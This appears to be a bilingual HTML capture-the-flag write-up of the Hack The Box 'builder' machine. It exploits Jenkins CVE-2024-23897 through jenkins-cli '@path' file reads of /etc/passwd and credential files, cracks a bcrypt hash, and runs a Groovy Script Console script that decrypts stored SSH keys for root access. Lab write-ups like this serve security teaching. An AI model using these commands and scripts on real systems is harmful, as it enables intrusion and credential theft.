@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>builder | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">builder</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running Jenkins version 2.441, which is vulnerable to CVE-2024-23897, an arbitrary file read vulnerability through the Jenkins CLI. By exploiting this path traversal flaw, I was able to read sensitive configuration files from the Jenkins home directory, including user configuration files that contained password hashes.</p>
+                    
+                    <p>After cracking the bcrypt password hash for the user <code>jennifer</code>, I gained authenticated access to the Jenkins web interface. This access allowed me to reach the Script Console at <code>/script</code>, where I could execute arbitrary Groovy code with Jenkins' privileges.</p>
+                    
+                    <p>Using the Script Console, I extracted encrypted SSH credentials stored in Jenkins' credential manager. These credentials included a root user's private SSH key that was encrypted using Jenkins' internal encryption. By leveraging Jenkins' own decryption APIs through Groovy scripting, I decrypted the private key and used it to establish SSH access as root on the underlying host system.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Jenkins CLI arbitrary file read (CVE-2024-23897), bcrypt password cracking, Jenkins Script Console Groovy code execution, Jenkins credential decryption via CredentialsProvider API.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image1.png"
+                        alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 8080 running Jenkins" />
+                </p>
+
+                <p>The scan reveals several services, most notably SSH on port 22 and an HTTP server on port 8080. The nmap scripts also detected some potential proxy-related findings, but upon investigation, these appear to be false positives from the nmap detection scripts.</p>
+
+                <h2>Jenkins Web Enumeration</h2>
+                <p>Navigating to the Jenkins web interface on port 8080, I can see in the footer that the application is running <strong>Jenkins version 2.441</strong>. This specific version information is crucial for vulnerability research.</p>
+
+                <h2>Vulnerability Research - CVE-2024-23897</h2>
+                <p>Searching for vulnerabilities affecting Jenkins 2.441, I discover a critical security flaw: <a
+                        href="https://nvd.nist.gov/vuln/detail/cve-2024-23897">CVE-2024-23897</a>. This vulnerability allows arbitrary file reading through the Jenkins CLI.</p>
+
+                <p>To better understand how to exploit this vulnerability, I search for public proof-of-concept code and find this implementation: <a
+                        href="https://github.com/Maalfer/CVE-2024-23897/blob/main/CVE-2024-23897.py">https://github.com/Maalfer/CVE-2024-23897/blob/main/CVE-2024-23897.py</a></p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>The vulnerability works through Jenkins' CLI functionality. Jenkins exposes a downloadable JAR file that implements a command-line interface for remote administration. The flaw allows path traversal when processing certain commands.</p>
+
+                <p>The basic exploitation pattern is:</p>
+                <pre><code class="language-bash">java -jar jenkins-cli.jar -s http://{ip}:{port}/ -http connect-node @{path}</code></pre>
+
+                <p>By using the <code>@</code> symbol followed by a file path, Jenkins will attempt to read that file and include it in the error response, effectively allowing arbitrary file reading.</p>
+
+                <h2>Exploiting the File Read Vulnerability</h2>
+                <p>I download the Jenkins CLI JAR file manually from the target server and create a simple bash wrapper script to make exploitation easier:</p>
+                <pre><code class="language-bash">#!/bin/bash
+java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node @$1</code></pre>
+
+                <p>This script allows me to quickly test different file paths by passing them as arguments.</p>
+
+                <h3>Enumerating System Users</h3>
+                <p>I start by reading <code>/etc/passwd</code> to enumerate system users. The output reveals an interesting finding:</p>
+                <pre><code class="language-plaintext">jenkins:x:1000:1000::/var/jenkins_home:/bin/bash</code></pre>
+
+                <p>There's a <code>jenkins</code> user with a home directory at <code>/var/jenkins_home</code>, but no other regular users are visible. This suggests the Jenkins instance might be running inside a container, which is a common deployment pattern.</p>
+
+                <h3>Targeting Jenkins Configuration Files</h3>
+                <p>Since I can read arbitrary files, I focus on Jenkins-specific configuration files that might contain sensitive information. My initial goal is to find files that could lead to credential disclosure or SSH access.</p>
+
+                <p>Jenkins stores encrypted credentials in several key files:</p>
+                <ul>
+                    <li><code>master.key</code> - Master encryption key</li>
+                    <li><code>hudson.util.Secret</code> - Binary file used for encryption</li>
+                    <li><code>credentials.xml</code> - Stores encrypted credentials</li>
+                </ul>
+
+                <p>I'm able to read <code>master.key</code> and <code>credentials.xml</code>, which contains an encrypted SSH private key for root. However, <code>hudson.util.Secret</code> is a binary file, and the file read vulnerability only works with text-based content. This limitation means I cannot directly decrypt the credentials at this stage.</p>
+
+                <h3>Discovering User Information</h3>
+                <p>I pivot to enumerating Jenkins users by reading <code>/var/jenkins_home/users/users.xml</code>. This file contains a mapping of usernames to their internal user IDs:</p>
+                <pre><code class="language-xml">Jennifer_12108429903186576833</code></pre>
+
+                <p>The web interface had already shown a user named <code>jennifer</code>, but now I have her internal user ID: <code>Jennifer_12108429903186576833</code>. This allows me to construct the path to her user-specific configuration file.</p>
+
+                <h2>Extracting and Cracking Credentials</h2>
+                <p>Using the discovered user ID, I read Jennifer's configuration file at:</p>
+                <pre><code class="language-plaintext">/var/jenkins_home/users/Jennifer_12108429903186576833/config.xml</code></pre>
+
+                <p>This configuration file contains valuable information:</p>
+                <pre><code class="language-xml">&lt;emailAddress&gt;jennifer@builder.htb&lt;/emailAddress&gt;
+&lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;</code></pre>
+
+                <p>The password is hashed using bcrypt (identifiable by the <code>$2a$</code> prefix), which is a strong hashing algorithm but still vulnerable to offline cracking if the password is weak.</p>
+
+                <p>I also notice a reference to a theme manager plugin, but this doesn't appear to be exploitable:</p>
+                <pre><code class="language-xml">&lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/&gt;</code></pre>
+
+                <h3>Password Cracking</h3>
+                <p>I use hashcat to attempt to crack the bcrypt hash. After running it against a common password wordlist, hashcat successfully recovers the plaintext password:</p>
+                <pre><code class="language-plaintext">$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess</code></pre>
+
+                <p>The password is <code>princess</code>, which is a weak password commonly found in wordlists.</p>
+
+                <h3>Testing the Credentials</h3>
+                <p>I first attempt to use these credentials for SSH access, but authentication fails. However, the credentials do work for logging into the Jenkins web interface as the user <code>jennifer</code>.</p>
+
+                <h2>Authenticated Access - Jenkins Script Console</h2>
+                <p>With authenticated access to Jenkins, I now have access to significantly more functionality. Most importantly, I can access the Script Console at <code>http://10.10.11.10:8080/script</code>.</p>
+
+                <p>The Script Console is a powerful feature in Jenkins that allows administrators to execute arbitrary Groovy scripts with the full privileges of the Jenkins process. This effectively gives me code execution on the system, but more importantly for this scenario, it allows me to interact with Jenkins' internal APIs.</p>
+
+                <h3>Decrypting Stored Credentials</h3>
+                <p>Jenkins stores credentials in an encrypted format using its own encryption system. While I couldn't decrypt these credentials earlier due to the binary nature of the encryption key file, I can now use Jenkins' own APIs to decrypt them from within the application.</p>
+
+                <p>I use the following Groovy script in the Script Console to extract and decrypt all stored SSH credentials:</p>
+                <pre><code class="language-groovy">import hudson.util.Secret
+import com.cloudbees.plugins.credentials.*
+import com.cloudbees.plugins.credentials.impl.*
+import com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey
+
+def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+    com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey.class,
+    Jenkins.instance,
+    null,
+    null
+)
+
+for (c in creds) {
+    println("\nCredential ID: " + c.id)
+    println("Username: " + c.username)
+    println("Description: " + c.description)
+    println("\nPrivate Key:")
+    println(c.privateKey)
+    println("-"*60)
+}</code></pre>
+
+                <p>This script does the following:</p>
+                <ul>
+                    <li>Imports the necessary Jenkins credential management classes</li>
+                    <li>Uses <code>CredentialsProvider.lookupCredentials()</code> to query all SSH private key credentials</li>
+                    <li>Iterates through each credential and accesses its <code>privateKey</code> property</li>
+                    <li>When accessing <code>privateKey</code>, Jenkins automatically decrypts it using its internal encryption system</li>
+                </ul>
+
+                <h3>Extracting Root's SSH Key</h3>
+                <p>The script output reveals the decrypted SSH private key for the root user:</p>
+                <pre><code class="language-plaintext">Credential ID: 1
+Username: root
+Description:
+
+Private Key:
+-----BEGIN OPENSSH PRIVATE KEY-----
+{private_key_content}
+-----END OPENSSH PRIVATE KEY-----
+------------------------------------------------------------</code></pre>
+
+                <p>This is the same encrypted key I saw earlier in <code>credentials.xml</code>, but now fully decrypted and ready to use.</p>
+
+                <h2>Privilege Escalation - Root Access via SSH</h2>
+                <p>With the decrypted private key in hand, I can now establish SSH access as root. I save the private key to a file named <code>id_rsa</code> on my local machine.</p>
+
+                <p>First, I set the correct permissions on the key file (SSH will refuse to use keys with overly permissive permissions):</p>
+                <pre><code class="language-bash">chmod 600 id_rsa</code></pre>
+
+                <p>Then I connect to the target machine using the private key:</p>
+                <pre><code class="language-bash">ssh -i id_rsa root@10.10.11.10</code></pre>
+
+                <p>This grants me direct root access to the system, allowing me to retrieve both the user and root flags and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba Jenkins versión 2.441, vulnerable a CVE-2024-23897, una vulnerabilidad de lectura arbitraria de archivos a través del CLI de Jenkins. Explotando este fallo de path traversal, pude leer archivos de configuración sensibles del directorio home de Jenkins, incluyendo archivos de configuración de usuarios que contenían hashes de contraseñas.</p>
+                    
+                    <p>Tras crackear el hash de contraseña bcrypt del usuario <code>jennifer</code>, obtuve acceso autenticado a la interfaz web de Jenkins. Este acceso me permitió alcanzar la Consola de Scripts en <code>/script</code>, donde pude ejecutar código Groovy arbitrario con los privilegios de Jenkins.</p>
+                    
+                    <p>Usando la Consola de Scripts, extraje credenciales SSH cifradas almacenadas en el gestor de credenciales de Jenkins. Estas credenciales incluían una clave privada SSH del usuario root que estaba cifrada usando el sistema de cifrado interno de Jenkins. Aprovechando las propias APIs de descifrado de Jenkins mediante scripting en Groovy, descifré la clave privada y la usé para establecer acceso SSH como root en el sistema host subyacente.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Lectura arbitraria de archivos del CLI de Jenkins (CVE-2024-23897), crackeo de contraseñas bcrypt, ejecución de código Groovy en la Consola de Scripts de Jenkins, descifrado de credenciales de Jenkins mediante la API de CredentialsProvider.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+                <p><img src="./media/image1.png"
+                        alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 8080 ejecutando Jenkins" />
+                </p>
+
+                <p>El escaneo revela varios servicios, destacando SSH en el puerto 22 y un servidor HTTP en el puerto 8080. Los scripts de nmap también detectaron algunos hallazgos potenciales relacionados con proxy, pero tras investigar, parecen ser falsos positivos de los scripts de detección de nmap.</p>
+
+                <h2>Enumeración Web de Jenkins</h2>
+                <p>Navegando a la interfaz web de Jenkins en el puerto 8080, puedo ver en el footer que la aplicación ejecuta <strong>Jenkins versión 2.441</strong>. Esta información específica de la versión es crucial para la investigación de vulnerabilidades.</p>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2024-23897</h2>
+                <p>Buscando vulnerabilidades que afecten a Jenkins 2.441, descubro un fallo de seguridad crítico: <a
+                        href="https://nvd.nist.gov/vuln/detail/cve-2024-23897">CVE-2024-23897</a>. Esta vulnerabilidad permite lectura arbitraria de archivos a través del CLI de Jenkins.</p>
+
+                <p>Para entender mejor cómo explotar esta vulnerabilidad, busco código de prueba de concepto público y encuentro esta implementación: <a
+                        href="https://github.com/Maalfer/CVE-2024-23897/blob/main/CVE-2024-23897.py">https://github.com/Maalfer/CVE-2024-23897/blob/main/CVE-2024-23897.py</a></p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad funciona a través de la funcionalidad CLI de Jenkins. Jenkins expone un archivo JAR descargable que implementa una interfaz de línea de comandos para administración remota. El fallo permite path traversal al procesar ciertos comandos.</p>
+
+                <p>El patrón básico de explotación es:</p>
+                <pre><code class="language-bash">java -jar jenkins-cli.jar -s http://{ip}:{puerto}/ -http connect-node @{ruta}</code></pre>
+
+                <p>Usando el símbolo <code>@</code> seguido de una ruta de archivo, Jenkins intentará leer ese archivo e incluirlo en la respuesta de error, permitiendo efectivamente lectura arbitraria de archivos.</p>
+
+                <h2>Explotando la Vulnerabilidad de Lectura de Archivos</h2>
+                <p>Descargo el archivo JAR del CLI de Jenkins manualmente desde el servidor objetivo y creo un script bash simple de envoltura para facilitar la explotación:</p>
+                <pre><code class="language-bash">#!/bin/bash
+java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node @$1</code></pre>
+
+                <p>Este script me permite probar rápidamente diferentes rutas de archivo pasándolas como argumentos.</p>
+
+                <h3>Enumerando Usuarios del Sistema</h3>
+                <p>Comienzo leyendo <code>/etc/passwd</code> para enumerar usuarios del sistema. La salida revela un hallazgo interesante:</p>
+                <pre><code class="language-plaintext">jenkins:x:1000:1000::/var/jenkins_home:/bin/bash</code></pre>
+
+                <p>Hay un usuario <code>jenkins</code> con directorio home en <code>/var/jenkins_home</code>, pero no son visibles otros usuarios regulares. Esto sugiere que la instancia de Jenkins podría estar ejecutándose dentro de un contenedor, lo cual es un patrón común de despliegue.</p>
+
+                <h3>Apuntando a Archivos de Configuración de Jenkins</h3>
+                <p>Como puedo leer archivos arbitrarios, me enfoco en archivos de configuración específicos de Jenkins que podrían contener información sensible. Mi objetivo inicial es encontrar archivos que puedan llevar a divulgación de credenciales o acceso SSH.</p>
+
+                <p>Jenkins almacena credenciales cifradas en varios archivos clave:</p>
+                <ul>
+                    <li><code>master.key</code> - Clave maestra de cifrado</li>
+                    <li><code>hudson.util.Secret</code> - Archivo binario usado para cifrado</li>
+                    <li><code>credentials.xml</code> - Almacena credenciales cifradas</li>
+                </ul>
+
+                <p>Puedo leer <code>master.key</code> y <code>credentials.xml</code>, que contiene una clave privada SSH cifrada para root. Sin embargo, <code>hudson.util.Secret</code> es un archivo binario, y la vulnerabilidad de lectura de archivos solo funciona con contenido basado en texto. Esta limitación significa que no puedo descifrar directamente las credenciales en esta etapa.</p>
+
+                <h3>Descubriendo Información de Usuarios</h3>
+                <p>Pivoto a enumerar usuarios de Jenkins leyendo <code>/var/jenkins_home/users/users.xml</code>. Este archivo contiene un mapeo de nombres de usuario a sus IDs de usuario internos:</p>
+                <pre><code class="language-xml">Jennifer_12108429903186576833</code></pre>
+
+                <p>La interfaz web ya había mostrado un usuario llamado <code>jennifer</code>, pero ahora tengo su ID de usuario interno: <code>Jennifer_12108429903186576833</code>. Esto me permite construir la ruta a su archivo de configuración específico de usuario.</p>
+
+                <h2>Extrayendo y Crackeando Credenciales</h2>
+                <p>Usando el ID de usuario descubierto, leo el archivo de configuración de Jennifer en:</p>
+                <pre><code class="language-plaintext">/var/jenkins_home/users/Jennifer_12108429903186576833/config.xml</code></pre>
+
+                <p>Este archivo de configuración contiene información valiosa:</p>
+                <pre><code class="language-xml">&lt;emailAddress&gt;jennifer@builder.htb&lt;/emailAddress&gt;
+&lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;</code></pre>
+
+                <p>La contraseña está hasheada usando bcrypt (identificable por el prefijo <code>$2a$</code>), que es un algoritmo de hashing fuerte pero aún vulnerable a crackeo offline si la contraseña es débil.</p>
+
+                <p>También veo una referencia a un plugin de gestor de temas, pero esto no parece ser explotable:</p>
+                <pre><code class="language-xml">&lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/&gt;</code></pre>
+
+                <h3>Crackeo de Contraseña</h3>
+                <p>Uso hashcat para intentar crackear el hash bcrypt. Tras ejecutarlo contra un diccionario de contraseñas comunes, hashcat recupera exitosamente la contraseña en texto plano:</p>
+                <pre><code class="language-plaintext">$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess</code></pre>
+
+                <p>La contraseña es <code>princess</code>, que es una contraseña débil comúnmente encontrada en diccionarios.</p>
+
+                <h3>Probando las Credenciales</h3>
+                <p>Primero intento usar estas credenciales para acceso SSH, pero la autenticación falla. Sin embargo, las credenciales sí funcionan para hacer login en la interfaz web de Jenkins como el usuario <code>jennifer</code>.</p>
+
+                <h2>Acceso Autenticado - Consola de Scripts de Jenkins</h2>
+                <p>Con acceso autenticado a Jenkins, ahora tengo acceso a significativamente más funcionalidad. Más importante aún, puedo acceder a la Consola de Scripts en <code>http://10.10.11.10:8080/script</code>.</p>
+
+                <p>La Consola de Scripts es una característica poderosa en Jenkins que permite a los administradores ejecutar scripts Groovy arbitrarios con todos los privilegios del proceso Jenkins. Esto efectivamente me da ejecución de código en el sistema, pero más importante para este escenario, me permite interactuar con las APIs internas de Jenkins.</p>
+
+                <h3>Descifrando Credenciales Almacenadas</h3>
+                <p>Jenkins almacena credenciales en formato cifrado usando su propio sistema de cifrado. Aunque no pude descifrar estas credenciales antes debido a la naturaleza binaria del archivo de clave de cifrado, ahora puedo usar las propias APIs de Jenkins para descifrarlas desde dentro de la aplicación.</p>
+
+                <p>Uso el siguiente script Groovy en la Consola de Scripts para extraer y descifrar todas las credenciales SSH almacenadas:</p>
+                <pre><code class="language-groovy">import hudson.util.Secret
+import com.cloudbees.plugins.credentials.*
+import com.cloudbees.plugins.credentials.impl.*
+import com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey
+
+def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+    com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey.class,
+    Jenkins.instance,
+    null,
+    null
+)
+
+for (c in creds) {
+    println("\nCredential ID: " + c.id)
+    println("Username: " + c.username)
+    println("Description: " + c.description)
+    println("\nPrivate Key:")
+    println(c.privateKey)
+    println("-"*60)
+}</code></pre>
+
+                <p>Este script hace lo siguiente:</p>
+                <ul>
+                    <li>Importa las clases necesarias de gestión de credenciales de Jenkins</li>
+                    <li>Usa <code>CredentialsProvider.lookupCredentials()</code> para consultar todas las credenciales de clave privada SSH</li>
+                    <li>Itera a través de cada credencial y accede a su propiedad <code>privateKey</code></li>
+                    <li>Al acceder a <code>privateKey</code>, Jenkins automáticamente la descifra usando su sistema de cifrado interno</li>
+                </ul>
+
+                <h3>Extrayendo la Clave SSH de Root</h3>
+                <p>La salida del script revela la clave privada SSH descifrada para el usuario root:</p>
+                <pre><code class="language-plaintext">Credential ID: 1
+Username: root
+Description:
+
+Private Key:
+-----BEGIN OPENSSH PRIVATE KEY-----
+{contenido_clave_privada}
+-----END OPENSSH PRIVATE KEY-----
+------------------------------------------------------------</code></pre>
+
+                <p>Esta es la misma clave cifrada que vi antes en <code>credentials.xml</code>, pero ahora completamente descifrada y lista para usar.</p>
+
+                <h2>Escalada de Privilegios - Acceso Root mediante SSH</h2>
+                <p>Con la clave privada descifrada en mano, ahora puedo establecer acceso SSH como root. Guardo la clave privada en un archivo llamado <code>id_rsa</code> en mi máquina local.</p>
+
+                <p>Primero, establezco los permisos correctos en el archivo de clave (SSH rechazará usar claves con permisos demasiado permisivos):</p>
+                <pre><code class="language-bash">chmod 600 id_rsa</code></pre>
+
+                <p>Luego me conecto a la máquina objetivo usando la clave privada:</p>
+                <pre><code class="language-bash">ssh -i id_rsa root@10.10.11.10</code></pre>
+
+                <p>Esto me otorga acceso root directo al sistema, permitiéndome recuperar tanto la flag de usuario como la de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
